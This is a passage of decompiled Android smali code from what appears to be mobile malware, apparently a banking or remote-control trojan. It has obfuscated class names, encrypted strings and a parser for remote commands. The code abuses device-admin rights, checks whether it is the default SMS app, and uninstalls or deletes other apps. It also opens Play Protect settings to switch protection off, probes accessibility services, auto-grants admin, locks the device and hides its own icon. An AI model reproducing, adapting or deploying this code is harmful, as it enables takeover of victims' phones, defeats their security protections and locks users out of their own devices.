    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 26
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_4

    const/16 v8, 0x1d

    if-lt v2, v8, :cond_16

    :try_start_a
    new-instance v2, Landroid/content/Intent;

    .line 27
    sget-object v6, Lb0/b;->o:Ljava/lang/String;

    .line 28
    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    invoke-direct {v2, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_1
    .catchall {:try_start_a .. :try_end_a} :catchall_4

    goto :goto_c

    :catch_1
    :try_start_b
    const-string v2, "S0hieDVNY0U2VHh5OWlhV0thMGxUZThjWEErTU5ndkF1T2x1OXBCSmZiZUZ6Uzh0aEdoNVRnbnJvN2I1dzZoeDo6T3U4VnYwTVFsZjdvaHFEWXY4V24xZz09"

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 30
    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, p1, v6}, Lh0/a;->x(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_c

    :cond_16
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, p1, v2}, Lh0/a;->x(Landroid/content/Context;Ljava/lang/String;)V

    :cond_17
    :goto_c
    invoke-static {p1}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_18

    const-string v2, "0"

    .line 31
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v6, v8, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_4

    goto :goto_d

    :catchall_4
    move-exception v2

    .line 32
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 33
    :cond_18
    :goto_d
    :try_start_c
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v6, "offSound"

    invoke-interface {v2, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_19

    move-object v2, v7

    .line 34
    :cond_19
    const-string v6, "1"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1a

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-virtual {v2, p1}, Lh0/a;->w(Landroid/content/Context;)V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_5

    goto :goto_e

    :catchall_5
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_1a
    :goto_e
    const-string v2, "package:"

    const-string v6, "android.intent.action.DELETE"

    const-string v8, "QlhJVE1rMzV1RnRJVVlCUmhWWGxndz09Ojpodkw1UXRDUHhGUmVWRit6aWxnTGFBPT0="

    .line 35
    :try_start_d
    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v9}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-interface {v9, v10, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    if-nez v9, :cond_1b

    move-object v9, v7

    .line 36
    :cond_1b
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v10

    const-string v11, "context.packageName"

    invoke-static {v10, v11}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v11, 0x2

    invoke-static {v9, v10, p2, v11}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v9
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_6

    if-eqz v9, :cond_1d

    :try_start_e
    new-instance v9, Landroid/content/ComponentName;

    const-class v10, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v9, p1, v10}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    if-eqz v10, :cond_1c

    check-cast v10, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v10, v9}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    goto :goto_f

    :cond_1c
    new-instance v9, Ljava/lang/NullPointerException;

    invoke-direct {v9, v1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v9
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_2
    .catchall {:try_start_e .. :try_end_e} :catchall_6

    :catch_2
    move-exception v9

    :try_start_f
    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    .line 37
    sget-object v9, Lb0/b;->a:Lb0/b;
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_6

    goto :goto_f

    :catchall_6
    move-exception v9

    .line 38
    invoke-static {v9}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 39
    :cond_1d
    :goto_f
    :try_start_10
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    invoke-static {v9, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v9, Landroid/app/admin/DevicePolicyManager;

    new-instance v10, Landroid/content/ComponentName;

    const-class v11, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v10, p1, v11}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v9, v10}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v9

    if-eqz v9, :cond_20

    .line 40
    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v9}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-interface {v9, v10, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    if-nez v9, :cond_1e

    move-object v9, v7

    .line 41
    :cond_1e
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v10

    if-lez v10, :cond_1f

    const/4 v10, 0x1

    goto :goto_10

    :cond_1f
    move v10, p2

    :goto_10
    if-eqz v10, :cond_20

    const/16 v10, 0x64

    new-instance v11, Landroid/content/Intent;

    const-class v12, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v11, p1, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v10, v11, p2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v10

    invoke-virtual {v10}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    move-result-object v10

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v11

    invoke-virtual {v11}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    move-result-object v11

    const-string v12, "context.packageManager.packageInstaller"

    invoke-static {v11, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v11, v9, v10}, Landroid/content/pm/PackageInstaller;->uninstall(Ljava/lang/String;Landroid/content/IntentSender;)V
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_7

    goto :goto_11

    :catchall_7
    move-exception v9

    invoke-static {v9}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_20
    :goto_11
    const/high16 v9, 0x40000000    # 2.0f

    const/high16 v10, 0x800000

    :try_start_11
    sget-object v11, Lh0/a;->a:Lh0/a;

    invoke-virtual {v11, p1}, Lh0/a;->o(Landroid/content/Context;)Z

    move-result v11

    if-eqz v11, :cond_23

    .line 42
    sget-object v11, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v11}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v11, v8, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    if-nez v8, :cond_21

    move-object v8, v7

    .line 43
    :cond_21
    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v11
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_8

    if-lez v11, :cond_22

    const/4 v11, 0x1

    goto :goto_12

    :cond_22
    move v11, p2

    :goto_12
    if-eqz v11, :cond_23

    :try_start_12
    new-instance v11, Landroid/content/Intent;

    invoke-direct {v11, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v2, v8}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v12

    invoke-virtual {v11, v12}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {p1, v11}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_3
    .catchall {:try_start_12 .. :try_end_12} :catchall_8

    goto :goto_13

    :catch_3
    :try_start_13
    new-instance v11, Landroid/content/Intent;

    invoke-direct {v11, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v2, v8}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v11, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {v11, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v11, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v11, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v11, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v11}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_8

    goto :goto_13

    :catchall_8
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_23
    :goto_13
    const-string v2, "cm5OSlpiUm5VVGpFdkwwUVhMa2JmZz09OjpjUXc4ZmZsR3Q0R3o4aDRqRXE4ZUhBPT0="

    .line 44
    :try_start_14
    sget-object v6, Lb0/b;->a:Lb0/b;

    .line 45
    sget-object v6, Lb0/b;->n:Ljava/lang/Class;
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_9

    .line 46
    :try_start_15
    new-instance v8, Landroid/content/ComponentName;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v8, p1, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v6, v11}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-nez v6, :cond_24

    goto :goto_14

    :cond_24
    new-instance v11, Landroid/text/TextUtils$SimpleStringSplitter;

    const/16 v12, 0x3a

    invoke-direct {v11, v12}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v11, v6}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_25
    invoke-virtual {v11}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_26

    invoke-virtual {v11}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v6

    if-eqz v6, :cond_25

    invoke-static {v6, v8}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_4
    .catchall {:try_start_15 .. :try_end_15} :catchall_9

    if-eqz v6, :cond_25

    const/4 v6, 0x1

    goto :goto_15

    :catch_4
    :cond_26
    :goto_14
    move v6, p2

    :goto_15
    if-eqz v6, :cond_29

    .line 47
    :try_start_16
    sget-object v6, Lh0/a;->a:Lh0/a;

    invoke-virtual {v6, p1}, Lh0/a;->o(Landroid/content/Context;)Z

    move-result v6

    if-eqz v6, :cond_29

    .line 48
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v8, "checkProtect"

    invoke-interface {v6, v8, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-nez v6, :cond_27

    move-object v6, v7

    .line 49
    :cond_27
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v6, v8}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_29

    .line 50
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v8, "goOffProtect"

    invoke-interface {v6, v8, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-nez v6, :cond_28

    move-object v6, v7

    .line 51
    :cond_28
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v6, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_29

    .line 52
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v6, "timeWorking"

    invoke-interface {v2, v6, p2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    const/16 v6, 0xc8

    if-le v2, v6, :cond_29

    .line 53
    const-string v2, "1"

    .line 54
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    const-string v8, "goOffProtect"

    invoke-interface {v6, v8, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 55
    new-instance v2, Landroid/content/Intent;

    const-string v6, "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"

    invoke-direct {v2, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v6, "com.google.android.gms"

    const-string v8, "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"

    invoke-virtual {v2, v6, v8}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x200000

    invoke-virtual {v2, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_9

    goto :goto_16

    :catchall_9
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 56
    :cond_29
    :goto_16
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    invoke-static {v2, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v2, Landroid/app/admin/DevicePolicyManager;

    new-instance v6, Landroid/content/ComponentName;

    const-class v8, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v6, p1, v8}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v6}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-nez v2, :cond_2e

    .line 57
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v6, "ckZGK2g5TTA1R1kzbnNEelFWZCtHQT09OjpIK2RzdkZkZy9BZUNGTGtzdzB6SHF3PT0="

    invoke-static {v2, v6, v7}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_2a

    move-object v2, v7

    .line 58
    :cond_2a
    const-string v6, "1"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2e

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-virtual {v2, p1}, Lh0/a;->o(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_2e

    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 59
    sget-object v2, Lb0/b;->n:Ljava/lang/Class;

    .line 60
    :try_start_17
    new-instance v6, Landroid/content/ComponentName;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v6, p1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_2b

    goto :goto_17

    :cond_2b
    new-instance v5, Landroid/text/TextUtils$SimpleStringSplitter;

    const/16 v8, 0x3a

    invoke-direct {v5, v8}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v5, v2}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_2c
    invoke-virtual {v5}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2d

    invoke-virtual {v5}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v2

    if-eqz v2, :cond_2c

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_5

    if-eqz v2, :cond_2c

    const/4 v2, 0x1

    goto :goto_18

    :catch_5
    :cond_2d
    :goto_17
    move v2, p2

    :goto_18
    if-eqz v2, :cond_2e

    .line 61
    const-string v2, "1"

    .line 62
    sget-object v5, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v5}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    const-string v6, "autoClickAdmin"

    invoke-interface {v5, v6, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 63
    new-instance v2, Landroid/content/Intent;

    .line 64
    sget-object v5, Lb0/b;->k:Ljava/lang/Class;

    .line 65
    invoke-direct {v2, p1, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "admin"

    const-string v6, "1"

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x20000000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_2e
    :try_start_18
    const-class v2, Lcom/cisojemopatude/yazi/nopofoyuwure/nagodehevazuyi;
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_7

    .line 66
    :try_start_19
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    if-nez v3, :cond_2f

    const/4 v3, 0x0

    goto :goto_19

    :cond_2f
    const-string v4, "activity"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    :goto_19
    if-eqz v3, :cond_31

    check-cast v3, Landroid/app/ActivityManager;

    const v4, 0x7fffffff

    invoke-virtual {v3, v4}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_30
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_32

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/ActivityManager$RunningServiceInfo;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v5

    iget-object v4, v4, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_30

    const/4 p2, 0x1

    goto :goto_1a

    :cond_31
    new-instance v2, Ljava/lang/NullPointerException;

    const-string v3, "null cannot be cast to non-null type android.app.ActivityManager"

    invoke-direct {v2, v3}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v2
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_6

    :catch_6
    :cond_32
    :goto_1a
    if-nez p2, :cond_35

    .line 67
    :try_start_1a
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "lockDevice"

    invoke-interface {p2, v2, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_33

    goto :goto_1b

    :cond_33
    move-object v7, p2

    .line 68
    :goto_1b
    const-string p2, "1"

    invoke-static {v7, p2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_35

    new-instance p2, Landroid/content/Intent;

    const-class v2, Lcom/cisojemopatude/yazi/nopofoyuwure/nagodehevazuyi;

    invoke-direct {p2, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance p2, Landroid/content/ComponentName;

    const-class v2, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {p2, p1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    if-eqz v0, :cond_34

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object p1

    const/4 v1, 0x1

    invoke-virtual {v0, p2, p1, v1}, Landroid/app/admin/DevicePolicyManager;->setApplicationHidden(Landroid/content/ComponentName;Ljava/lang/String;Z)Z

    goto :goto_1c

    :cond_34
    new-instance p1, Ljava/lang/NullPointerException;

    invoke-direct {p1, v1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_7

    :catch_7
    move-exception p1

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    .line 69
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 70
    :cond_35
    :goto_1c
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final f(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "action"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v1, "~no_command~"

    invoke-static {p2, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const-string p2, "L1hxSjBZaW9oL2hQK3ZETGJHcFp1UT09OjpiTWw2cjQzVUs4T2l0UzRQd3N1T3RBPT0="

    invoke-static {p2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object p2, Lb0/b;->a:Lb0/b;

    .line 2
    invoke-virtual {p0, p1, p3}, Lh0/b;->a(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    sget-object p2, Lm0/a;->c:Lm0/a;

    if-ne p1, p2, :cond_0

    return-object p1

    :cond_0
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1

    :cond_1
    const-string p3, "~settings~"

    invoke-static {p2, p3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p3

    if-eqz p3, :cond_4

    const-string p1, "SDRhZkVCY2RVSEZuNS9YVmovQS8rUT09OjpjOFNHZ0tmUDIyRnVHeldkSDZ5NjZBPT0="

